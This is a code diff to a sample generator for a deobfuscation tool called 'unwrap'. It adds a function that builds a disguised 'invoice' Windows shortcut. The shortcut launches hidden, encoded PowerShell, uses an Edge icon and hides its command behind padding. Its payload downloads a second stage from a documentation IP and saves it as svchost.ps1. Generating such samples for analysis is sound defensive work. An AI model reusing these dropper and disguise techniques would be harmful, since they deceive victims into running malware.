@@ -6,20 +6,24 @@ nothing in them is ever meant to run. Same seed, same samples.
 
     python examples/make_samples.py
     unwrap examples/samples/dropper.bat
+
+    python examples/make_samples.py --lnk | unwrap -     # a shortcut, built in memory and piped: never on disk
 """
 
+import base64
 import random
 import sys
 from pathlib import Path
 
-sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "tests"))
+sys.path[:0] = [str(Path(__file__).resolve().parent.parent / "tests"), str(Path(__file__).resolve().parent.parent)]
 import obfuscator as ob  # noqa: E402
+from lnkwriter import make_lnk  # noqa: E402
 
 DL = "Download" + "File"
 
 
-def dropper(rng):
-    """cmd launcher -> -EncodedCommand -> Invoke-Obfuscation IEX -> XOR -> deflate -> chars -> format string."""
+def dropper_ps(rng):
+    """Invoke-Obfuscation IEX -> XOR -> deflate -> chars -> format string."""
     payload = ("$u = 'http://203.0.113.50/update/stage2.ps1'\r\n"
                "$d = \"$env:APPDATA\\Microsoft\\svchost.ps1\"\r\n"
                f"(New-Object Net.WebClient).{DL}($u, $d)\r\n"
@@ -28,7 +32,20 @@ def dropper(rng):
     code = payload
     for technique in (ob.ps_format, ob.ps_chars, ob.ps_gzip, ob.ps_xor, ob.ps_concat):
         code = technique(rng, code)
-    return ob.batch_launcher(rng, code)
+    return code
+
+
+def dropper(rng):
+    """cmd launcher -> -EncodedCommand -> the PowerShell layers above."""
+    return ob.batch_launcher(rng, dropper_ps(rng))
+
+
+def shortcut(rng):
+    """An 'invoice' shortcut: PowerShell with an Edge icon, a hidden window and its command pushed out of sight."""
+    enc = base64.b64encode(dropper_ps(rng).encode("utf-16-le")).decode()
+    return make_lnk(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                    " " * 260 + f"-nop -w hidden -enc {enc}", show=7, machine="desktop-7rq2k1",
+                    icon=r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe", workdir=r"%TEMP%")
 
 
 def loader(rng):
@@ -65,4 +82,7 @@ def main(out: Path) -> None:
 
 
 if __name__ == "__main__":
+    if sys.argv[1:] == ["--lnk"]:
+        sys.stdout.buffer.write(shortcut(random.Random(2026)))
+        sys.exit()
     main(Path(sys.argv[1]) if len(sys.argv) > 1 else Path(__file__).resolve().parent / "samples")
